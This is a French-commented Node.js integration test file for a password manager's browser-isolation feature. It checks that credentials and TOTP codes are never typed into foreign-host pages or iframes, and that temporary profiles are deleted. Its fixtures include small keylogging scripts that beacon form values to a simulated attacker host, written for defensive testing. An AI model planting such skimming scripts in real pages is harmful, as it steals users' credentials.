// ========================================
// TESTS D'INTÉGRATION RBI (vrai Chromium, serveurs HTTP locaux)
// ========================================
// RBI-11 : un identifiant, un mot de passe ou un code TOTP n'est jamais saisi dans un document
// dont l'hôte ne correspond pas à celui de l'URL de l'entrée (même règle que l'extension,
// hostMatch.hostsMatch). Site A = 127.0.0.1 (hôte de l'entrée), site B = 127.0.0.2 (étranger).
// RBI-12 : le profil éphémère (cookies de session du site) est supprimé à la fermeture, y compris
// quand l'utilisateur ferme la fenêtre, et les profils orphelins sont supprimés au démarrage suivant.
//
// Chromium : E2E_BROWSER (chemin de chrome.exe) ou, à défaut, chrome-rbi/ du projet ; sinon les tests
// sont ignorés. Le répertoire temporaire (TEMP/TMP) est redirigé vers un dossier jetable AVANT le
// chargement de secureSession : profils rbi-* et nettoyage au démarrage n'y touchent que ce dossier.
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const http = require('node:http');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const PROJECT_ROOT = path.join(__dirname, '..');

function findChromeDir() {
  const fromEnv = process.env.E2E_BROWSER;
  if (fromEnv && fs.existsSync(fromEnv)) return path.dirname(fromEnv);
  const embedded = path.join(PROJECT_ROOT, 'chrome-rbi', 'chrome.exe');
  if (fs.existsSync(embedded)) return path.dirname(embedded);
  return null;
}

const CHROME_DIR = findChromeDir();
const SKIP = CHROME_DIR ? false : 'Chromium introuvable (E2E_BROWSER ou chrome-rbi/)';

// Répertoire temporaire jetable (profils rbi-* de ce test uniquement)
const TMP_ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'rdvault-rbi-it-'));
const TEMP_DIR = path.join(TMP_ROOT, 'temp');
fs.mkdirSync(TEMP_DIR);
process.env.TEMP = TEMP_DIR;
process.env.TMP = TEMP_DIR;
process.env.RDVAULT_LOG_LEVEL = process.env.RDVAULT_LOG_LEVEL || 'warn';
if (CHROME_DIR) {
  // getEmbeddedChromePath() cherche d'abord <resourcesPath>/chrome-rbi/chrome.exe
  const res = path.join(TMP_ROOT, 'res');
  fs.mkdirSync(res);
  try {
    fs.symlinkSync(CHROME_DIR, path.join(res, 'chrome-rbi'), 'junction');
    process.resourcesPath = res;
  } catch { /* repli : chrome-rbi/ du projet */ }
}

const secureSession = require('./secureSession');
// Motifs d'échec RBI traduits (mainI18n) : français imposé, les assertions ci-dessous portent sur le texte d'origine
require('./mainI18n').setDefaultLanguageProvider(() => 'fr');

const USER = 'alice@corp.example';
const PASS = 'S3cret-Of-A!';
const TOTP = '493817';
const POLICIES = { disableClipboard: true, disableNewTabs: true, disableDownloads: false, ttlMinutes: 0 };

// ---------- Serveurs : A (hôte de l'entrée) et B (hôte étranger, « mouchard ») ----------
const received = { A: [], B: [] };
let PA = 0;
let PB = 0;
const A = () => `http://127.0.0.1:${PA}`;
const B = () => `http://127.0.0.2:${PB}`;

// Script de B : remonte toute valeur saisie dans ses champs, frappe par frappe
const SPY = `<script>
  function leak(tag){ var v=[].map.call(document.querySelectorAll('input'),function(i){return i.name+'='+i.value}).join('&');
    if (v.replace(/[^=&]*=(&|$)/g,'')) navigator.sendBeacon('/capture', tag+': '+v); }
  document.addEventListener('input', function(){ leak('input'); }, true);
  document.addEventListener('keyup', function(){ leak('keyup'); }, true);
  setInterval(function(){ leak('poll'); }, 200);
</script>`;

const html = (body) => `<!doctype html><html><head><meta charset="utf-8"></head><body>${body}</body></html>`;

function readBody(req) {
  return new Promise((resolve) => {
    let b = '';
    req.on('data', (c) => { b += c; });
    req.on('end', () => resolve(b));
  });
}

function send(res, status, body, headers = {}) {
  res.writeHead(status, { 'Content-Type': 'text/html; charset=utf-8', ...headers });
  res.end(body);
}

const serverB = http.createServer(async (req, res) => {
  const body = await readBody(req);
  received.B.push(`${req.method} ${req.url} ${body}`);
  if (req.url.startsWith('/capture') || req.method === 'POST') return send(res, 200, html('<h1>Bienvenue (B)</h1>'));
  if (req.url.startsWith('/login')) {
    return send(res, 200, html(`<h1>Login B</h1><form method="post" action="/login">
      <input type="email" name="email"><input type="password" name="password">
      <button type="submit">Sign in</button></form>${SPY}`));
  }
  if (req.url.startsWith('/widget')) {
    return send(res, 200, html(`<form method="post" action="/widget-submit">
      <input type="email" name="widget_email"><input type="password" name="widget_pw">
      <button type="submit">Sign in</button></form>${SPY}`));
  }
  if (req.url.startsWith('/otp-widget')) {
    return send(res, 200, html(`<form method="post" action="/otp-submit">
      <input type="text" name="otp" inputmode="numeric" maxlength="6" autocomplete="one-time-code">
      <button type="submit">Verify</button></form>${SPY}`));
  }
  return send(res, 404, '');
});

const LOGIN_FORM = (action) => `<h1>Connexion A</h1><form method="post" action="${action}">
  <input type="text" name="user"><input type="password" name="pass">
  <button type="submit">Se connecter</button></form>`;

// Script d'une page AUTORISÉE : remonte uniquement les événements clavier / saisie (écouteurs)
const KEY_SPY = `<script>
  function leak(tag){ var v=[].map.call(document.querySelectorAll('input'),function(i){return i.name+'='+i.value}).join('&');
    navigator.sendBeacon('/capture', tag+': '+v); }
  document.addEventListener('input', function(){ leak('input'); }, true);
  document.addEventListener('keydown', function(){ leak('keydown'); }, true);
  document.addEventListener('keyup', function(){ leak('keyup'); }, true);
</script>`;

const serverA = http.createServer(async (req, res) => {
  const body = await readBody(req);
  received.A.push(`${req.method} ${req.headers.host} ${req.url} ${body}`);
  const url = req.url;
  if (url.startsWith('/capture')) return send(res, 200, 'ok');
  if (url === '/oopif-login') {
    // Page de l'entrée (www.ovhcloud.com) dont le formulaire est dans une iframe d'un domaine
    // ÉQUIVALENT (auth.ovh.com) : autorisée, mais hors processus (site différent)
    return send(res, 200, html(`<h1>Portail</h1><iframe src="http://auth.ovh.com:${PA}/frame-login" style="width:500px;height:200px"></iframe>`));
  }
  if (url === '/frame-login') return send(res, 200, html(`${LOGIN_FORM('/frame-login')}${KEY_SPY}`));
  if (req.method === 'POST') {
    if (url === '/login-totp') return send(res, 302, '', { Location: '/mfa-foreign' });
    if (url === '/login-totp-legit') return send(res, 302, '', { Location: '/mfa-legit' });
    if (url === '/otp-legit') return send(res, 302, '', { Location: '/home' });
    if (url === '/step1-next') return send(res, 302, '', { Location: `${B()}/login` });
    return send(res, 302, '', {
      Location: '/home',
      'Set-Cookie': 'auth_session=SESSION-TOKEN-123; Max-Age=86400; Path=/; HttpOnly',
    });
  }
  if (url === '/home') return send(res, 200, html('<h1>Accueil connecté (A)</h1>'));
  if (url === '/redirect') return send(res, 302, '', { Location: `${B()}/login` });
  if (url === '/landing') {
    return send(res, 200, html(`<header><nav><a href="${B()}/login">Sign in</a></nav></header>
      <p>Portail A (page d'accueil sans formulaire)</p>`));
  }
  if (url === '/iframe') {
    // Formulaire de A rendu tardivement (SPA) + widget tiers B (email + mot de passe) visible d'emblée
    return send(res, 200, html(`<div id="app">Chargement…</div>
      <iframe src="${B()}/widget" style="width:400px;height:120px"></iframe>
      <script>setTimeout(function(){ document.getElementById('app').innerHTML =
        ${JSON.stringify(LOGIN_FORM('/a-login'))}; }, 6000);</script>`));
  }
  if (url === '/go-sibling') {
    // Redirection vers un sous-domaine frère du même domaine de base : autorisée
    return send(res, 302, '', { Location: `http://login.rdvtest.localhost:${PA}/login` });
  }
  if (url === '/step1') {
    // Connexion en deux étapes : l'étape « mot de passe » est servie par B (redirection après l'identifiant)
    return send(res, 200, html(`<h1>Connexion A</h1><form method="post" action="/step1-next">
      <input type="email" name="email"><button type="submit">Next</button></form>`));
  }
  if (url === '/login' || url === '/a-login') return send(res, 200, html(LOGIN_FORM('/a-login')));
  if (url === '/login-totp') return send(res, 200, html(LOGIN_FORM('/login-totp')));
  if (url === '/login-totp-legit') return send(res, 200, html(LOGIN_FORM('/login-totp-legit')));
  if (url === '/mfa-foreign') {
    // Page MFA de A sans champ OTP, avec un widget tiers B contenant un champ OTP
    return send(res, 200, html(`<h1>Vérification</h1><p>Saisissez votre code</p>
      <iframe src="${B()}/otp-widget" style="width:400px;height:120px"></iframe>`));
  }
  if (url === '/mfa-legit') {
    return send(res, 200, html(`<h1>Vérification</h1><form method="post" action="/otp-legit">
      <input type="text" name="otp" inputmode="numeric" maxlength="6" autocomplete="one-time-code">
      <button type="submit">Verify</button></form>`));
  }
  return send(res, 404, '');
});

// Le secret apparaît-il (en clair ou encodé) dans ce qu'a reçu un serveur ?
function leaked(list, secret) {
  // Brut (beacon text/plain), encodeURIComponent, et application/x-www-form-urlencoded (« ! » → %21)
  const formEncoded = new URLSearchParams({ v: secret }).toString().slice(2);
  const forms = [secret, encodeURIComponent(secret), formEncoded];
  return list.filter((entry) => forms.some((f) => entry.includes(f)));
}
// Un préfixe d'au moins 2 caractères du secret (frappe par frappe) a-t-il fuité ?
function leakedPrefix(list, secret) {
  const prefix = secret.slice(0, 2);
  return list.filter((entry) => entry.includes(`=${prefix}`) || entry.includes(`=${encodeURIComponent(prefix)}`));
}

function rbiProfiles() {
  return fs.readdirSync(TEMP_DIR).filter((e) => e.startsWith('rbi-'));
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function launch(url, extra = {}) {
  return secureSession.launchSecureSession({ url, username: USER, password: PASS, policies: POLICIES, ...extra });
}

test.before(async () => {
  if (SKIP) return;
  await new Promise((r) => serverA.listen(0, '127.0.0.1', r));
  await new Promise((r) => serverB.listen(0, '127.0.0.2', r));
  PA = serverA.address().port;
  PB = serverB.address().port;
});

test.beforeEach(() => {
  received.A.length = 0;
  received.B.length = 0;
});

test.afterEach(async () => {
  if (SKIP) return;
  await secureSession.closeAllSessions();
});

test.after(async () => {
  if (!SKIP) {
    await secureSession.closeAllSessions();
    serverA.close();
    serverB.close();
  }
  try { fs.rmSync(TMP_ROOT, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 }); } catch { /* ignore */ }
});

// ---------------------------------------------------------------------------------------------
// RBI-11 : saisie liée à l'hôte de l'entrée
// ---------------------------------------------------------------------------------------------

test('RBI-11 témoin : formulaire sur l\'hôte de l\'entrée → identifiants saisis et session ouverte', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`${A()}/login`);
  assert.strictEqual(result.success, true, JSON.stringify(result));
  assert.strictEqual(leaked(received.A, PASS).length > 0, true, 'A doit recevoir le mot de passe');
  assert.strictEqual(leaked(received.A, USER).length > 0, true, 'A doit recevoir l\'identifiant');
});

test('RBI-11 : redirection vers un sous-domaine frère (même domaine de base) → autorisée', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`http://portal.rdvtest.localhost:${PA}/go-sibling`);
  assert.strictEqual(result.success, true, JSON.stringify(result));
  const posts = received.A.filter((e) => e.startsWith('POST login.rdvtest.localhost'));
  assert.strictEqual(leaked(posts, PASS).length > 0, true, 'login.rdvtest.localhost doit recevoir le mot de passe');
});

test('RBI-11 : redirection 302 de A vers B → rien saisi chez B, session refusée', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`${A()}/redirect`);
  assert.deepStrictEqual(leaked(received.B, PASS), [], 'B ne doit jamais recevoir le mot de passe de A');
  assert.deepStrictEqual(leaked(received.B, USER), [], 'B ne doit jamais recevoir l\'identifiant de A');
  assert.deepStrictEqual(leakedPrefix(received.B, PASS), [], 'aucune frappe du mot de passe chez B');
  assert.strictEqual(result.success, false);
  assert.match(result.error, /hors du domaine de l'entrée/);
  assert.strictEqual(result.code, 'RBI_FOREIGN_ORIGIN', 'code stable traduisible côté interface');
});

test('RBI-11 : redirection 302 de A vers l\'hôte du champ « website » de l\'entrée (B) → saisie autorisée chez B, comme l\'extension', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`${A()}/redirect`, { website: B() });
  assert.notStrictEqual(result.code, 'RBI_FOREIGN_ORIGIN', JSON.stringify(result));
  const posts = received.B.filter((e) => e.startsWith('POST /login'));
  assert.strictEqual(leaked(posts, PASS).length > 0, true, 'B (website de l\'entrée) doit recevoir le mot de passe');
  // Témoin : un website sans rapport ne change rien (B reste étranger à l'entrée)
  received.B.length = 0;
  const refused = await launch(`${A()}/redirect`, { website: 'https://autre.example' });
  assert.strictEqual(refused.code, 'RBI_FOREIGN_ORIGIN');
  assert.deepStrictEqual(leaked(received.B, PASS), []);
});

test('RBI-11 : page d\'accueil A avec lien « Sign in » vers B → rien saisi chez B, session refusée', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`${A()}/landing`);
  assert.deepStrictEqual(leaked(received.B, PASS), []);
  assert.deepStrictEqual(leaked(received.B, USER), []);
  assert.deepStrictEqual(leakedPrefix(received.B, PASS), []);
  assert.strictEqual(result.success, false);
  assert.match(result.error, /hors du domaine de l'entrée/);
  assert.strictEqual(result.code, 'RBI_FOREIGN_ORIGIN', 'code stable traduisible côté interface');
});

test('RBI-11 : iframe tierce B avec champs de connexion → ignorée, formulaire de A rempli', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`${A()}/iframe`);
  assert.deepStrictEqual(leaked(received.B, PASS), [], 'le widget B ne doit pas recevoir le mot de passe');
  assert.deepStrictEqual(leaked(received.B, USER), [], 'le widget B ne doit pas recevoir l\'identifiant');
  assert.deepStrictEqual(leakedPrefix(received.B, PASS), [], 'aucune frappe chez B');
  assert.strictEqual(leaked(received.A, PASS).length > 0, true, 'A doit recevoir le mot de passe');
  assert.strictEqual(result.success, true, JSON.stringify(result));
});

test('RBI-11 : connexion en deux étapes dont l\'étape « mot de passe » est sur B → mot de passe jamais saisi chez B', { skip: SKIP, timeout: 120000 }, async () => {
  const result = await launch(`${A()}/step1`);
  assert.strictEqual(leaked(received.A, USER).length > 0, true, 'l\'identifiant est saisi sur A (hôte de l\'entrée)');
  assert.deepStrictEqual(leaked(received.B, PASS), [], 'B ne doit jamais recevoir le mot de passe');
  assert.deepStrictEqual(leakedPrefix(received.B, PASS), [], 'aucune frappe du mot de passe chez B');
  assert.strictEqual(result.success, false);
  assert.match(result.error, /hors du domaine de l'entrée/);
  assert.strictEqual(result.code, 'RBI_FOREIGN_ORIGIN', 'code stable traduisible côté interface');
});

test('RBI-11 : iframe hors processus d\'un domaine équivalent → saisie avec SON JavaScript désactivé (aucune frappe captée)', { skip: SKIP, timeout: 120000 }, async () => {
  // www.ovhcloud.com et auth.ovh.com (domaines équivalents de hostMatch) résolus vers 127.0.0.1
  const puppeteer = require('puppeteer-core');
  const originalLaunch = puppeteer.launch;
  puppeteer.launch = (opts) => originalLaunch.call(puppeteer, {
    ...opts,
    args: [...(opts.args || []), '--host-resolver-rules=MAP www.ovhcloud.com 127.0.0.1, MAP auth.ovh.com 127.0.0.1'],
  });
  let result;
  try {
    result = await launch(`http://www.ovhcloud.com:${PA}/oopif-login`);
  } finally {
    puppeteer.launch = originalLaunch;
  }
  const fromFrame = received.A.filter((e) => e.startsWith('POST auth.ovh.com'));
  const posts = fromFrame.filter((e) => e.includes(' /frame-login '));
  assert.strictEqual(leaked(posts, PASS).length > 0, true, 'le formulaire de l\'iframe autorisée reçoit le mot de passe');
  const keyEvents = fromFrame.filter((e) => / \/capture (input|keydown|keyup):/.test(e));
  assert.deepStrictEqual(keyEvents, [], 'aucun écouteur clavier de l\'iframe ne doit voir la saisie');
  assert.strictEqual(typeof result.success, 'boolean');
});

test('RBI-11 : code TOTP jamais saisi dans une iframe étrangère (page MFA de A + widget B)', { skip: SKIP, timeout: 150000 }, async () => {
  const result = await launch(`${A()}/login-totp`, { totp: TOTP });
  assert.strictEqual(leaked(received.A, PASS).length > 0, true, 'A doit recevoir le mot de passe');
  assert.deepStrictEqual(leaked(received.B, TOTP), [], 'B ne doit pas recevoir le code TOTP');
  assert.deepStrictEqual(leakedPrefix(received.B, TOTP), [], 'aucune frappe du code TOTP chez B');
  assert.deepStrictEqual(leaked(received.B, PASS), []);
  assert.strictEqual(typeof result.success, 'boolean');
});

test('RBI-11 témoin TOTP : champ OTP sur l\'hôte de l\'entrée → code saisi', { skip: SKIP, timeout: 150000 }, async () => {
  const result = await launch(`${A()}/login-totp-legit`, { totp: TOTP });
  assert.strictEqual(result.success, true, JSON.stringify(result));
  const otpPosts = received.A.filter((e) => e.includes('/otp-legit'));
  assert.strictEqual(leaked(otpPosts, TOTP).length > 0, true, 'A doit recevoir le code TOTP');
});

// ---------------------------------------------------------------------------------------------
// RBI-12 : suppression du profil éphémère
// ---------------------------------------------------------------------------------------------

test('RBI-12 : closeSession supprime le profil (attente de la fin de Chromium)', { skip: SKIP, timeout: 120000 }, async () => {
  const before = new Set(rbiProfiles());
  const result = await launch(`${A()}/login`);
  assert.strictEqual(result.success, true, JSON.stringify(result));
  const profile = rbiProfiles().find((p) => !before.has(p));
  assert.ok(profile, 'profil rbi-* créé dans le TEMP redirigé');
  await secureSession.closeSession(result.sessionId);
  assert.strictEqual(fs.existsSync(path.join(TEMP_DIR, profile)), false, `profil ${profile} encore présent après closeSession`);
  assert.deepStrictEqual(secureSession.getActiveSessions(), []);
});

test('RBI-12 : fenêtre fermée par l\'utilisateur → profil supprimé', {
  skip: SKIP || (process.platform !== 'win32' ? 'Windows uniquement' : false), timeout: 120000,
}, async () => {
  const before = new Set(rbiProfiles());
  const result = await launch(`${A()}/login`);
  assert.strictEqual(result.success, true, JSON.stringify(result));
  const profile = rbiProfiles().find((p) => !before.has(p));
  assert.ok(profile);
  await sleep(1000);
  // Équivalent d'un clic sur la croix de la fenêtre (WM_CLOSE) du processus principal Chromium
  const ps = `$p = Get-CimInstance Win32_Process -Filter "name='chrome.exe'" | Where-Object { $_.CommandLine -like '*${profile}*' -and $_.CommandLine -notmatch '--type=' }; foreach ($x in $p) { (Get-Process -Id $x.ProcessId).CloseMainWindow() | Out-Null }`;
  execFileSync('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps]);
  const dir = path.join(TEMP_DIR, profile);
  const deadline = Date.now() + 30000;
  while (fs.existsSync(dir) && Date.now() < deadline) await sleep(250);
  assert.strictEqual(fs.existsSync(dir), false, `profil ${profile} encore présent 30 s après la fermeture`);
  assert.deepStrictEqual(secureSession.getActiveSessions(), []);
});

test('RBI-12 : au démarrage, profils orphelins supprimés quel que soit leur âge, profil en cours d\'usage conservé', { skip: SKIP, timeout: 120000 }, async () => {
  // Orphelin récent (crash / fermeture de l'application avant la fin du nettoyage)
  const orphan = path.join(TEMP_DIR, 'rbi-0123456789abcdef');
  fs.mkdirSync(path.join(orphan, 'Default', 'Network'), { recursive: true });
  fs.writeFileSync(path.join(orphan, 'Default', 'Network', 'Cookies'), 'auth_session=SESSION-TOKEN-123');
  fs.writeFileSync(path.join(orphan, 'lockfile'), ''); // verrou d'un Chromium disparu (non tenu)
  // Session vivante : son profil est verrouillé par Chromium et doit survivre
  const before = new Set(rbiProfiles());
  const result = await launch(`${A()}/login`);
  assert.strictEqual(result.success, true, JSON.stringify(result));
  const live = rbiProfiles().find((p) => !before.has(p) && p !== path.basename(orphan));
  assert.ok(live);
  // « Démarrage suivant » : un nouveau processus charge secureSession avec le même TEMP et lance le nettoyage
  // du démarrage (appelé par main.js une fois le verrou d'instance unique obtenu, STARTUP-23)
  execFileSync(process.execPath, ['-e', `require(${JSON.stringify(path.join(__dirname, 'secureSession.js'))}).cleanupStaleProfiles()`], {
    env: { ...process.env, TEMP: TEMP_DIR, TMP: TEMP_DIR, RDVAULT_LOG_LEVEL: 'silent' },
  });
  assert.strictEqual(fs.existsSync(orphan), false, 'profil orphelin récent supprimé au démarrage');
  assert.strictEqual(fs.existsSync(path.join(TEMP_DIR, live)), true, 'profil d\'une session vivante conservé');
  assert.deepStrictEqual(secureSession.getActiveSessions().map((s) => s.sessionId), [result.sessionId]);
  await secureSession.closeSession(result.sessionId);
  assert.strictEqual(fs.existsSync(path.join(TEMP_DIR, live)), false);
});
